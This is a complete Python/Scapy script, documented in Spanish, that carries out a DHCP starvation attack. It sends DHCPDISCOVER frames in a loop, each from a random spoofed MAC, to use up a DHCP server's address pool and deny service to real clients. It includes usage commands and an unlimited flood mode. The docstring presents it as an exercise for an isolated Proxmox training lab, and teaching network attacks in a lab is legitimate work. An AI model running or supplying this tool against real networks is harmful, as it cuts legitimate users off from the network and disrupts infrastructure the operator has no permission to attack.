#!/usr/bin/env python3
"""
dhcp_starvation.py — Ataque de DHCP Starvation con Scapy

Envía peticiones DHCPDISCOVER en bucle, cada una con una dirección MAC
de origen distinta y aleatoria, simulando a muchos clientes distintos
pidiendo IP a la vez. El objetivo es agotar el pool de direcciones
disponibles de un servidor DHCP legítimo, de forma que deje de poder
atender a clientes reales.

Uso:
    sudo python3 dhcp_starvation.py -i eth0 -n 200
    sudo python3 dhcp_starvation.py -i eth0 -n 0           # infinito, hasta Ctrl+C
    sudo python3 dhcp_starvation.py -i eth0 -n 50 -t 0.2   # 50 peticiones, 0.2s entre cada una

Requiere permisos de root (construye y envía tramas a nivel de enlace)
y la librería scapy:
    sudo apt install -y python3-scapy

Entorno de pruebas: lab aislado en Proxmox (bridge vmbr1), actividad
M0375/M0378/MC037. Ver README.md de esta carpeta para el contexto
completo del laboratorio.
"""

import argparse
import random
import sys
import time

from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, sendp


def random_mac() -> str:
    """Genera una MAC aleatoria distinta en cada llamada."""
    return str(RandMAC())


def build_discover(mac: str, xid: int) -> Ether:
    """Construye una trama DHCPDISCOVER completa con la MAC y el XID indicados."""
    mac_bytes = bytes.fromhex(mac.replace(":", ""))
    return (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac_bytes, xid=xid, flags=0x8000)
        / DHCP(options=[("message-type", "discover"), "end"])
    )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DHCP Starvation: inunda la red con DHCPDISCOVER desde MACs falsas."
    )
    parser.add_argument(
        "-i", "--iface", required=True, help="Interfaz de red a usar (ej: eth0)"
    )
    parser.add_argument(
        "-n",
        "--count",
        type=int,
        default=100,
        help="Número de peticiones a enviar (0 = infinito hasta Ctrl+C). Por defecto: 100",
    )
    parser.add_argument(
        "-t",
        "--interval",
        type=float,
        default=0.1,
        help="Segundos de espera entre cada petición. Por defecto: 0.1",
    )
    args = parser.parse_args()

    print(f"[*] Interfaz: {args.iface}")
    print(f"[*] Peticiones: {'infinitas' if args.count == 0 else args.count}")
    print(f"[*] Intervalo: {args.interval}s")
    print("[*] Pulsa Ctrl+C para detener en cualquier momento.\n")

    sent = 0
    try:
        while args.count == 0 or sent < args.count:
            mac = random_mac()
            xid = random.randint(0, 0xFFFFFFFF)
            pkt = build_discover(mac, xid)

            sendp(pkt, iface=args.iface, verbose=False)
            sent += 1
            print(f"[{sent}] DHCPDISCOVER enviado - MAC origen: {mac} - XID: {xid:#010x}")

            if args.interval:
                time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[!] Detenido por el usuario (Ctrl+C).")
    except PermissionError:
        print(
            "[!] Permiso denegado: este script necesita privilegios de root "
            "para construir y enviar tramas a nivel de enlace. Ejecuta con sudo.",
            file=sys.stderr,
        )
        sys.exit(1)

    print(f"\n[*] Total de peticiones DHCPDISCOVER enviadas: {sent}")


if __name__ == "__main__":
    main()
